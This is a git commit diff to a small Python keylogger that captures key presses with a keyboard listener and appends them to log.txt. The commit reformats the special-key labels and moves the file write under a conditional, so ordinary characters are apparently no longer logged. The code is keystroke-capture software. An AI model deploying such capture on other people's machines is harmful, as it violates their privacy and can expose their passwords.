fc3c9de4f5678a15bf57c704c71c74755d984ac8
Rahil Halai <134063723+RahilHalai7@users.noreply.github.com>
2025-06-21 23:37:04 +0530

    Add files via upload

--- main.py
+++ main.py
@@ -7,46 +7,47 @@ def writetofile(key):
     key_mappings = {
         'Key.space': " ",
         'Key.enter': "\n",
-        'Key.shift': " [shift] ",
-        'Key.shift_l': " [left shift] ",
-        'Key.shift_r': " [right shift] ",
-        'Key.ctrl': " [ctrl] ",
-        'Key.ctrl_l': " [left ctrl] ",
-        'Key.ctrl_r': " [right ctrl] ",
-        'Key.alt': " [alt] ",
-        'Key.alt_l': " [left alt] ",
-        'Key.alt_r': " [right alt] ",
-        'Key.alt_gr': " [alt gr] ",
-        'Key.cmd': " [cmd] ",
-        'Key.cmd_l': " [left cmd] ",
-        'Key.cmd_r': " [right cmd] ",
-        'Key.backspace': " [backspace] ",
-        'Key.caps_lock': " [caps lock] ",
-        'Key.delete': " [delete] ",
-        'Key.down': " [down arrow] ",
-        'Key.up': " [up arrow] ",
-        'Key.left': " [left arrow] ",
-        'Key.right': " [right arrow] ",
-        'Key.end': " [end] ",
-        'Key.esc': " [esc] ",
-        'Key.f1': " [f1] ",
-        'Key.home': " [home] ",
-        'Key.insert': " [insert] ",
-        'Key.menu': " [menu] ",
-        'Key.num_lock': " [num lock] ",
-        'Key.page_down': " [page down] ",
-        'Key.page_up': " [page up] ",
-        'Key.pause': " [pause/break] ",
-        'Key.print_screen': " [print screen] ",
-        'Key.scroll_lock': " [scroll lock] ",
-        'Key.tab': " [tab] "
+        'Key.shift': " [shift] \n",
+        'Key.shift_l': " [left shift] \n",
+        'Key.shift_r': " [right shift] \n",
+        'Key.ctrl': " [ctrl] \n",
+        'Key.ctrl_l': " [left ctrl] \n",
+        'Key.ctrl_r': " [right ctrl] \n",
+        'Key.alt': " [alt] \n",
+        'Key.alt_l': " [left alt] \n",
+        'Key.alt_r': " [right alt] \n",
+        'Key.alt_gr': " [alt gr] \n",
+        'Key.cmd': " [cmd] \n",
+        'Key.cmd_l': " [left cmd] \n",
+        'Key.cmd_r': " [right cmd] \n",
+        'Key.backspace': " [backspace] \n",
+        'Key.caps_lock': " [caps lock] \n",
+        'Key.delete': " [delete] \n",
+        'Key.down': " [down arrow] \n",
+        'Key.up': " [up arrow] \n",
+        'Key.left': " [left arrow] \n",
+        'Key.right': " [right arrow] \n",
+        'Key.end': " [end] \n",
+        'Key.esc': " [esc] \n",
+        'Key.f1': " [f1] \n",
+        'Key.home': " [home] \n",
+        'Key.insert': " [insert] \n",
+        'Key.menu': " [menu] \n",
+        'Key.num_lock': " [num lock] \n",
+        'Key.page_down': " [page down] \n",
+        'Key.page_up': " [page up] \n",
+        'Key.pause': " [pause/break] \n",
+        'Key.print_screen': " [print screen] \n",
+        'Key.scroll_lock': " [scroll lock] \n",
+        'Key.tab': " [tab] \n"
     }
+
 
     if letter in key_mappings:
         letter = key_mappings[letter]
 
-    with open("log.txt", 'a') as f:
-        f.write(letter)
+        with open("log.txt", 'a') as f:
+            f.write(letter)
 
 with KeyboardListener(on_press=writetofile) as listener: #here listener is the variable 
     listener.join()
